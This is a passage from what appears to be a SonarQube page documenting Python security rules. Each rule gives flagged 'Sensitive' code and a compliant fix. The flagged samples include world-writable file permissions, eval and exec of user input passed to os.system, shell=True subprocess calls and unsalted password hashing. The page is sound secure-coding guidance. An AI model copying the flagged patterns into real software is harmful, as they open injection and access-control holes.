<h2>Recommended Secure Coding Practices</h2>
<p>The most restrictive possible permissions should be assigned to files and directories.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://docs.python.org/3/library/os.html#os.umask" rel="nofollow">os.umask</a>:</p>
<pre>
os.umask(0)  # Sensitive
</pre>
<p>For <a href="https://docs.python.org/3/library/os.html#os.chmod" rel="nofollow">os.chmod</a>, <a href="https://docs.python.org/3/library/os.html#os.lchmod" rel="nofollow">os.lchmod</a>, and <a href="https://docs.python.org/3/library/os.html#os.fchmod" rel="nofollow">os.fchmod</a>:</p>
<pre>
os.chmod(&#34;/tmp/fs&#34;, stat.S_IRWXO)   # Sensitive
os.lchmod(&#34;/tmp/fs&#34;, stat.S_IRWXO)  # Sensitive
os.fchmod(fd, stat.S_IRWXO)         # Sensitive
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://docs.python.org/3/library/os.html#os.umask" rel="nofollow">os.umask</a>:</p>
<pre>
os.umask(0o777)
</pre>
<p>For <a href="https://docs.python.org/3/library/os.html#os.chmod" rel="nofollow">os.chmod</a>, <a href="https://docs.python.org/3/library/os.html#os.lchmod" rel="nofollow">os.lchmod</a>, and <a href="https://docs.python.org/3/library/os.html#os.fchmod" rel="nofollow">os.fchmod</a>:</p>
<pre>
os.chmod(&#34;/tmp/fs&#34;, stat.S_IRWXU)
os.lchmod(&#34;/tmp/fs&#34;, stat.S_IRWXU)
os.fchmod(fd, stat.S_IRWXU)
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/" rel="nofollow">OWASP Top 10 2021 Category A4</a> - Insecure Design </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li><li> <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission" rel="nofollow">OWASP File Permission</a> </li><li> <a href="https://cwe.mitre.org/data/definitions/732" rel="nofollow">MITRE, CWE-732</a> - Incorrect Permission Assignment for Critical Resource </li><li> <a href="https://cwe.mitre.org/data/definitions/266" rel="nofollow">MITRE, CWE-266</a> - Incorrect Privilege Assignment </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S1523">
              python:S1523
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated, and will eventually be removed.</p>
<p>Executing code dynamically is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2017-9807" rel="nofollow">CVE-2017-9807</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2017-9802" rel="nofollow">CVE-2017-9802</a> </li></ul>
<p>Some APIs enable the execution of dynamic code by providing it as strings at runtime. These APIs might be useful in some very specific
meta-programming use-cases. However most of the time their use is frowned upon because they also increase the risk of maliciously <a href="https://owasp.org/www-community/attacks/Code_Injection" rel="nofollow">Injected Code</a>. Such attacks can either run on the server or in the client (example:
XSS attack) and have a huge impact on an application’s security.</p>
<p>This rule marks for review each occurrence of such dynamic code execution. This rule does not detect code injections. It only highlights the use of
APIs which should be used sparingly and very carefully.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> the executed code may come from an untrusted source and hasn’t been sanitized. </li><li> you really need to run code dynamically. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Regarding the execution of unknown code, the best solution is to not run code provided by an untrusted source. If you really need to do it, run the
code in a <a href="https://en.wikipedia.org/wiki/Sandbox_%28computer_security%29" rel="nofollow">sandboxed</a> environment. Use jails, firewalls and whatever means your
operating system and programming language provide (example: <a href="https://wiki.sei.cmu.edu/confluence/display/java/SEC54-J.&#43;Create&#43;a&#43;secure&#43;sandbox&#43;using&#43;a&#43;security&#43;manager" rel="nofollow">Security Managers</a> in java, <a href="https://www.w3schools.com/tags/att_iframe_sandbox.asp" rel="nofollow">iframes</a> and <a href="https://en.wikipedia.org/wiki/Same-origin_policy" rel="nofollow">same-origin
policy</a> for javascript in a web browser).</p>
<p>Do not try to create a blacklist of dangerous code. It is impossible to cover all attacks that way.</p>
<p>Avoid using dynamic code APIs whenever possible. Hard-coded code is always safer.</p>
<h2>Sensitive Code Example</h2>
<pre>
import os

value &#61; input()
command &#61; &#39;os.system(&#34;%s&#34;)&#39; % value

def evaluate(command, file, mode):
    eval(command)  # Sensitive.

eval(command)  # Sensitive. Dynamic code

def execute(code, file, mode):
    exec(code)  # Sensitive.
    exec(compile(code, file, mode))  # Sensitive.

exec(command)  # Sensitive.
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/95" rel="nofollow">MITRE, CWE-95</a> - Improper Neutralization of Directives in Dynamically Evaluated Code
  (&#39;Eval Injection&#39;) </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S2053">
              python:S2053
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability increases the likelihood that attackers are able to compute the cleartext of password hashes.</p>
<h2>Why is this an issue?</h2>
<p>During the process of password hashing, an additional component, known as a &#34;salt,&#34; is often integrated to bolster the overall security. This salt,
acting as a defensive measure, primarily wards off certain types of attacks that leverage pre-computed tables to crack passwords.</p>
<p>However, potential risks emerge when the salt is deemed insecure. This can occur when the salt is consistently the same across all users or when it
is too short or predictable. In scenarios where users share the same password and salt, their password hashes will inevitably mirror each other.
Similarly, a short salt heightens the probability of multiple users unintentionally having identical salts, which can potentially lead to identical
password hashes. These identical hashes streamline the process for potential attackers to recover clear-text passwords. Thus, the emphasis on
implementing secure, unique, and sufficiently lengthy salts in password-hashing functions is vital.</p>
<h3>What is the potential impact?</h3>
<p>Despite best efforts, even well-guarded systems might have vulnerabilities that could allow an attacker to gain access to the hashed passwords.
This could be due to software vulnerabilities, insider threats, or even successful phishing attempts that give attackers the access they need.</p>
<p>Once the attacker has these hashes, they will likely attempt to crack them using a couple of methods. One is brute force, which entails trying
every possible combination until the correct password is found. While this can be time-consuming, having the same salt for all users or a short salt
can make the task significantly easier and faster.</p>
<p>If multiple users have the same password and the same salt, their password hashes would be identical. This means that if an attacker successfully
cracks one hash, they have effectively cracked all identical ones, granting them access to multiple accounts at once.</p>
<p>A short salt, while less critical than a shared one, still increases the odds of different users having the same salt. This might create clusters
of password hashes with identical salt that can then be attacked as explained before.</p>
<p>With short salts, the probability of a collision between two users&#39; passwords and salts couple might be low depending on the salt size. The shorter
the salt, the higher the collision probability. In any case, using longer, cryptographically secure salt should be preferred.</p>
<h2>How to fix it in Python Standard Library</h2>
<h3>Code examples</h3>
<p>The following code contains examples of hard-coded salts.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
import crypt

hash &#61; crypt.crypt(password) # Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
import crypt

salt &#61; crypt.mksalt(crypt.METHOD_SHA256)
hash &#61; crypt.crypt(password, salt)
</pre>
<h3>How does this work?</h3>
<p>This code ensures that each user’s password has a unique salt value associated with it. It generates a salt randomly and with a length that
provides the required security level. It uses a salt length of at least 16 bytes (128 bits), as recommended by industry standards.</p>
<p>Here, the compliant code example ensures the salt is random and has a sufficient length by calling the <code>crypt.mksalt</code> function. This one
internally uses a cryptographically secure pseudo random number generator.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP</a> Top 10:2021 A02:2021 - Cryptographic Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP</a> - Top 10 2017 - A03:2017 - Sensitive Data
  Exposure </li><li> <a href="https://cwe.mitre.org/data/definitions/759" rel="nofollow">CWE</a> - CWE-759: Use of a One-Way Hash without a Salt </li><li> <a href="https://cwe.mitre.org/data/definitions/760" rel="nofollow">CWE</a> - CWE-760: Use of a One-Way Hash with a Predictable Salt </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S4721">
              python:S4721
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated, and will eventually be removed.</p>
<p>Arbitrary OS command injection vulnerabilities are more likely when a shell is spawned rather than a new process, indeed shell meta-chars can be
used (when parameters are user-controlled for instance) to inject OS commands.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> OS command name or parameters are user-controlled. </li></ul>
<p>There is a risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Use functions that don’t spawn a shell.</p>
<h2>Sensitive Code Example</h2>
<p>Python 3</p>
<pre>
subprocess.run(cmd, shell&#61;True)  # Sensitive
subprocess.Popen(cmd, shell&#61;True)  # Sensitive
subprocess.call(cmd, shell&#61;True)  # Sensitive
subprocess.check_call(cmd, shell&#61;True)  # Sensitive
subprocess.check_output(cmd, shell&#61;True)  # Sensitive
os.system(cmd)  # Sensitive: a shell is always spawn
</pre>
<p>Python 2</p>
<pre>
cmd &#61; &#34;when a string is passed through these function, a shell is spawn&#34;
(_, child_stdout, _) &#61; os.popen2(cmd)  # Sensitive
(_, child_stdout, _) &#61; os.popen3(cmd)  # Sensitive
(_, child_stdout) &#61; os.popen4(cmd)  # Sensitive


(child_stdout, _) &#61; popen2.popen2(cmd)  # Sensitive
(child_stdout, _, _) &#61; popen2.popen3(cmd)  # Sensitive
(child_stdout, _) &#61; popen2.popen4(cmd)  # Sensitive
</pre>
<h2>Compliant Solution</h2>
<p>Python 3</p>
<pre>
# by default shell&#61;False, a shell is not spawn
subprocess.run(cmd)  # Compliant
subprocess.Popen(cmd)  # Compliant
subprocess.call(cmd)  # Compliant
subprocess.check_call(cmd)  # Compliant
subprocess.check_output(cmd)  # Compliant

# always in a subprocess:
os.spawnl(mode, path, *cmd)  # Compliant
os.spawnle(mode, path, *cmd, env)  # Compliant
os.spawnlp(mode, file, *cmd)  # Compliant
os.spawnlpe(mode, file, *cmd, env)  # Compliant
os.spawnv(mode, path, cmd)  # Compliant
os.spawnve(mode, path, cmd, env)  # Compliant
os.spawnvp(mode, file, cmd)  # Compliant
os.spawnvpe(mode, file, cmd, env)  # Compliant

(child_stdout) &#61; os.popen(cmd, mode, 1)  # Compliant
(_, output) &#61; subprocess.getstatusoutput(cmd)  # Compliant
out &#61; subprocess.getoutput(cmd)  # Compliant
os.startfile(path)  # Compliant
os.execl(path, *cmd)  # Compliant
os.execle(path, *cmd, env)  # Compliant
os.execlp(file, *cmd)  # Compliant
os.execlpe(file, *cmd, env)  # Compliant
os.execv(path, cmd)  # Compliant
os.execve(path, cmd, env)  # Compliant
os.execvp(file, cmd)  # Compliant
os.execvpe(file, cmd, env)  # Compliant
</pre>
<p>Python 2</p>
<pre>
cmdsargs &#61; (&#34;use&#34;, &#34;a&#34;, &#34;sequence&#34;, &#34;to&#34;, &#34;directly&#34;, &#34;start&#34;, &#34;a&#34;, &#34;subprocess&#34;)

(_, child_stdout) &#61; os.popen2(cmdsargs)  # Compliant
(_, child_stdout, _) &#61; os.popen3(cmdsargs)  # Compliant
(_, child_stdout) &#61; os.popen4(cmdsargs)  # Compliant

(child_stdout, _) &#61; popen2.popen2(cmdsargs)  # Compliant
(child_stdout, _, _) &#61; popen2.popen3(cmdsargs)  # Compliant
(child_stdout, _) &#61; popen2.popen4(cmdsargs)  # Compliant
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/78" rel="nofollow">MITRE, CWE-78</a> - Improper Neutralization of Special Elements used in an OS Command </li><li> <a href="https://www.sans.org/top25-software-errors/#cat1" rel="nofollow">SANS Top 25</a> - Insecure Interaction Between Components </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S3752">
              python:S3752
            </a>
          </td>
          <td>
            <details>
              <p>An HTTP method is safe when used to perform a read-only operation, such as retrieving information. In contrast, an unsafe HTTP method is used to
change the state of an application, for instance to update a user’s profile on a web application.</p>
<p>Common safe HTTP methods are GET, HEAD, or OPTIONS.</p>
<p>Common unsafe HTTP methods are POST, PUT and DELETE.</p>
<p>Allowing both safe and unsafe HTTP methods to perform a specific operation on a web application could impact its security, for example CSRF
protections are most of the time only protecting operations performed by unsafe HTTP methods.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> HTTP methods are not defined at all for a route/controller of the application. </li><li> Safe HTTP methods are defined and used for a route/controller that can change the state of an application. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>For all the routes/controllers of an application, the authorized HTTP methods should be explicitly defined and safe HTTP methods should only be
used to perform read-only operations.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://www.djangoproject.com/" rel="nofollow">Django</a>:</p>
<pre>
# No method restriction
def view(request):  # Sensitive
    return HttpResponse(&#34;...&#34;)
</pre>
<pre>
&#64;require_http_methods([&#34;GET&#34;, &#34;POST&#34;])  # Sensitive
def view(request):
    return HttpResponse(&#34;...&#34;)
</pre>
<p>For <a href="https://flask.palletsprojects.com/en/1.1.x/" rel="nofollow">Flask</a>:</p>
<pre>
&#64;methods.route(&#39;/sensitive&#39;, methods&#61;[&#39;GET&#39;, &#39;POST&#39;])  # Sensitive
def view():
    return Response(&#34;...&#34;, 200)
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://www.djangoproject.com/" rel="nofollow">Django</a>:</p>
<pre>
&#64;require_http_methods([&#34;POST&#34;])
def view(request):
    return HttpResponse(&#34;...&#34;)
</pre>
<pre>
&#64;require_POST
def view(request):
    return HttpResponse(&#34;...&#34;)
</pre>
<pre>
&#64;require_GET
def view(request):
    return HttpResponse(&#34;...&#34;)
</pre>
<pre>
&#64;require_safe
def view(request):
    return HttpResponse(&#34;...&#34;)
</pre>
<p>For <a href="https://flask.palletsprojects.com/en/1.1.x/" rel="nofollow">Flask</a>:</p>
<pre>
&#64;methods.route(&#39;/compliant1&#39;)
def view():
    return Response(&#34;...&#34;, 200)
</pre>
<pre>
&#64;methods.route(&#39;/compliant2&#39;, methods&#61;[&#39;GET&#39;])
def view():
    return Response(&#34;...&#34;, 200)
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/" rel="nofollow">OWASP Top 10 2021 Category A4</a> - Insecure Design </li><li> <a href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A5-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> -
  Broken Access Control </li><li> <a href="https://cwe.mitre.org/data/definitions/352" rel="nofollow">MITRE, CWE-352</a> - Cross-Site Request Forgery (CSRF) </li><li> <a href="https://owasp.org/www-community/attacks/csrf" rel="nofollow">OWASP: Cross-Site Request Forgery</a> </li><li> <a href="https://www.sans.org/top25-software-errors/#cat1" rel="nofollow">SANS Top 25</a> - Insecure Interaction Between Components </li><li> <a href="https://docs.djangoproject.com/en/3.1/topics/http/decorators/#allowed-http-methods" rel="nofollow">Django</a> - Allowed HTTP Methods </li><li> <a href="https://flask.palletsprojects.com/en/1.1.x/quickstart/#http-methods" rel="nofollow">Flask</a> - HTTP Methods </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S6463">
              python:S6463
            </a>
          </td>
          <td>
            <details>
              <p>Allowing unrestricted outbound communications can lead to data leaks.</p>
<p>A restrictive security group is an additional layer of protection that might prevent the abuse or exploitation of a resource. For example, it
complicates the exfiltration of data in the case of a successfully exploited vulnerability.</p>
<p>When deciding if outgoing connections should be limited, consider that limiting the connections results in additional administration and
maintenance work.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The resource has access to sensitive data. </li><li> The resource is part of a private network. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It is recommended to restrict outgoing connections to a set of trusted destinations.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.SecurityGroup.html" rel="nofollow">aws_cdk.aws_ec2.SecurityGroup</a>:</p>
<pre>
from aws_cdk import (
    aws_ec2 as ec2
)

ec2.SecurityGroup(  # Sensitive; allow_all_outbound is enabled by default
    self,
    &#34;example&#34;,
    vpc&#61;vpc
)
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_ec2.SecurityGroup.html" rel="nofollow">aws_cdk.aws_ec2.SecurityGroup</a>:</p>
<pre>
from aws_cdk import (
    aws_ec2 as ec2
)

sg &#61; ec2.SecurityGroup(
    self,
    &#34;example&#34;,
    vpc&#61;vpc,
    allow_all_outbound&#61;False
)

sg.add_egress_rule(
    peer&#61;ec2.Peer.ipv4(&#34;203.0.113.127/32&#34;),
    connection&#61;ec2.Port.tcp(443)
)
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://docs.aws.amazon.com/vpc/latest/userguide/VPC_SecurityGroups.html" rel="nofollow">AWS Documentation</a> - Control traffic to resources using
  security groups </li><li> <a href="https://cwe.mitre.org/data/definitions/284" rel="nofollow">MITRE, CWE-284</a> - Improper Access Control </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S6327">
              python:S6327
            </a>
          </td>
          <td>
            <details>
              <p>Amazon Simple Notification Service (SNS) is a managed messaging service for application-to-application (A2A) and application-to-person (A2P)
communication. SNS topics allows publisher systems to fanout messages to a large number of subscriber systems. Amazon SNS allows to encrypt messages
when they are received. In the case that adversaries gain physical access to the storage medium or otherwise leak a message they are not able to
access the data.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The topic contains sensitive data that could cause harm when leaked. </li><li> There are compliance requirements for the service to store data encrypted. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to encrypt SNS topics that contain sensitive information. Encryption and decryption are handled transparently by SNS, so no
further modifications to the application are necessary.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_sns.Topic.html" rel="nofollow">aws_cdk.aws_sns.Topic</a>:</p>
<pre>
from aws_cdk import (
    aws_sns as sns
)

class TopicStack(Stack):
    def __init__(self, scope: Construct, construct_id: str, **kwargs) -&gt; None:
        super().__init__(scope, construct_id, **kwargs)
        sns.Topic( # Sensitive, unencrypted by default
            self,
            &#34;example&#34;
        )
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_sns.CfnTopic.html" rel="nofollow">aws_cdk.aws_sns.CfnTopic</a>:</p>
<pre>
from aws_cdk import (
    aws_sns as sns
)

class TopicStack(Stack):
    def __init__(self, scope: Construct, construct_id: str, **kwargs) -&gt; None:
        super().__init__(scope, construct_id, **kwargs)
        sns.CfnTopic( # Sensitive, unencrypted by default
            self,
            &#34;example&#34;
        )
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_sns.Topic.html" rel="nofollow">aws_cdk.aws_sns.Topic</a>:</p>
<pre>
from aws_cdk import (
    aws_sns as sns
)

class TopicStack(Stack):
    def __init__(self, scope: Construct, construct_id: str, **kwargs) -&gt; None:
        super().__init__(scope, construct_id, **kwargs)
        my_key &#61; kms.Key(self, &#34;key&#34;)
        sns.Topic(
            self,
            &#34;example&#34;,
            master_key&#61;my_key
        )
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_sns.CfnTopic.html" rel="nofollow">aws_cdk.aws_sns.CfnTopic</a>:</p>
<pre>
from aws_cdk import (
    aws_sns as sns
)

class TopicStack(Stack):
    def __init__(self, scope: Construct, construct_id: str, **kwargs) -&gt; None:
        super().__init__(scope, construct_id, **kwargs)
        my_key &#61; kms.Key(self, &#34;key&#34;)
        sns.CfnTopic(
            self,
            &#34;example&#34;,
            kms_master_key_id&#61;my_key.key_id
        )
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/" rel="nofollow">OWASP Top 10 2021 Category A4</a> - Insecure Design </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://docs.aws.amazon.com/sns/latest/dg/sns-server-side-encryption.html" rel="nofollow">AWS Documentation</a> - Encryption at rest </li><li> <a href="https://aws.amazon.com/blogs/compute/encrypting-messages-published-to-amazon-sns-with-aws-kms/" rel="nofollow">Encrypting messages published to
  Amazon SNS with AWS KMS</a> </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/311" rel="nofollow">MITRE, CWE-311</a> - Missing Encryption of Sensitive Data </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S1313">
              python:S1313
            </a>
          </td>
          <td>
            <details>
              <p>Hardcoding IP addresses is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2006-5901" rel="nofollow">CVE-2006-5901</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2005-3725" rel="nofollow">CVE-2005-3725</a> </li></ul>
<p>Today’s services have an ever-changing architecture due to their scaling and redundancy needs. It is a mistake to think that a service will always
have the same IP address. When it does change, the hardcoded IP will have to be modified too. This will have an impact on the product development,
delivery, and deployment:</p>
<ul><li> The developers will have to do a rapid fix every time this happens, instead of having an operation team change a configuration file. </li><li> It misleads to use the same address in every environment (dev, sys, qa, prod). </li></ul>
<p>Last but not least it has an effect on application security. Attackers might be able to decompile the code and thereby discover a potentially
sensitive address. They can perform a Denial of Service attack on the service, try to get access to the system, or try to spoof the IP address to
bypass security checks. Such attacks can always be possible, but in the case of a hardcoded IP address solving the issue will take more time, which
will increase an attack’s impact.</p>
<h2>Ask Yourself Whether</h2>
<p>The disclosed IP address is sensitive, e.g.:</p>
<ul><li> Can give information to an attacker about the network topology. </li><li> It’s a personal (assigned to an identifiable person) IP address. </li></ul>
<p>There is a risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Don’t hard-code the IP address in the source code, instead make it configurable with environment variables, configuration files, or a similar
approach. Alternatively, if confidentially is not required a domain name can be used since it allows to change the destination quickly without having
to rebuild the software.</p>
<h2>Sensitive Code Example</h2>
<pre>
ip &#61; &#39;192.168.12.42&#39;
sock &#61; socket.socket()
sock.bind((ip, 9090))
</pre>
<h2>Compliant Solution</h2>
<pre>
ip &#61; config.get(section, ipAddress)
sock &#61; socket.socket()
sock.bind((ip, 9090))
</pre>
<h2>Exceptions</h2>
<p>No issue is reported for the following cases because they are not considered sensitive:</p>
<ul><li> Loopback addresses 127.0.0.0/8 in CIDR notation (from 127.0.0.0 to 127.255.255.255) </li><li> Broadcast address 255.255.255.255 </li><li> Non-routable address 0.0.0.0 </li><li> Strings of the form <code>2.5.&lt;number&gt;.&lt;number&gt;</code> as they <a href="http://www.oid-info.com/introduction.htm" rel="nofollow">often match
  Object Identifiers</a> (OID) </li><li> Addresses in the ranges 192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24, reserved for documentation purposes by <a href="https://datatracker.ietf.org/doc/html/rfc5737" rel="nofollow">RFC 5737</a> </li><li> Addresses in the range 2001:db8::/32, reserved for documentation purposes by <a href="https://datatracker.ietf.org/doc/html/rfc3849" rel="nofollow">RFC
  3849</a> </li></ul>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S6329">
              python:S6329
            </a>
          </td>
          <td>
            <details>
              <p>Enabling public network access to cloud resources can affect an organization’s ability to protect its data or internal operations from data theft
or disruption.</p>
<p>Depending on the component, inbound access from the Internet can be enabled via:</p>
<ul><li> a boolean value that explicitly allows access to the public network. </li><li> the assignment of a public IP address. </li><li> database firewall rules that allow public IP ranges. </li></ul>
<p>Deciding to allow public access may happen for various reasons such as for quick maintenance, time saving, or by accident.</p>
<p>This decision increases the likelihood of attacks on the organization, such as:</p>
<ul><li> data breaches. </li><li> intrusions into the infrastructure to permanently steal from it. </li><li> and various malicious traffic, such as DDoS attacks. </li></ul>
<h2>Ask Yourself Whether</h2>
<p>This cloud resource:</p>
<ul><li> should be publicly accessible to any Internet user. </li><li> requires inbound traffic from the Internet to function properly. </li></ul>
<p>There is a risk if you answered no to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Avoid publishing cloud services on the Internet unless they are intended to be publicly accessible, such as customer portals or e-commerce
sites.</p>
<p>Use private networks (and associated private IP addresses) and VPC peering or other secure communication tunnels to communicate with other cloud
components.</p>
<p>The goal is to prevent the component from intercepting traffic coming in via the public IP address. If the cloud resource does not support the
absence of a public IP address, assign a public IP address to it, but do not create listeners for the public IP address.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_ec2/Instance.html" rel="nofollow">aws_cdk.aws_ec2.Instance</a> and similar constructs:</p>
<pre>
from aws_cdk import aws_ec2 as ec2

ec2.Instance(
    self,
    &#34;vpc_subnet_public&#34;,
    instance_type&#61;nano_t2,
    machine_image&#61;ec2.MachineImage.latest_amazon_linux(),
    vpc&#61;vpc,
    vpc_subnets&#61;ec2.SubnetSelection(subnet_type&#61;ec2.SubnetType.PUBLIC) # Sensitive
)
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_ec2/CfnInstance.html" rel="nofollow">aws_cdk.aws_ec2.CfnInstance</a>:</p>
<pre>
from aws_cdk import aws_ec2 as ec2

ec2.CfnInstance(
    self,
    &#34;cfn_public_exposed&#34;,
    instance_type&#61;&#34;t2.micro&#34;,
    image_id&#61;&#34;ami-0ea0f26a6d50850c5&#34;,
    network_interfaces&#61;[
        ec2.CfnInstance.NetworkInterfaceProperty(
            device_index&#61;&#34;0&#34;,
            associate_public_ip_address&#61;True, # Sensitive
            delete_on_termination&#61;True,
            subnet_id&#61;vpc.select_subnets(subnet_type&#61;ec2.SubnetType.PUBLIC).subnet_ids[0]
        )
    ]
)
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_dms/CfnReplicationInstance.html" rel="nofollow">aws_cdk.aws_dms.CfnReplicationInstance</a>:</p>
<pre>
from aws_cdk import aws_dms as dms

rep_instance &#61; dms.CfnReplicationInstance(
    self,
    &#34;explicit_public&#34;,
    replication_instance_class&#61;&#34;dms.t2.micro&#34;,
    allocated_storage&#61;5,
    publicly_accessible&#61;True, # Sensitive
    replication_subnet_group_identifier&#61;subnet_group.replication_subnet_group_identifier,
    vpc_security_group_ids&#61;[vpc.vpc_default_security_group]
)
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_rds/CfnDBInstance.html" rel="nofollow">aws_cdk.aws_rds.CfnDBInstance</a>:</p>
<pre>
from aws_cdk import aws_rds as rds
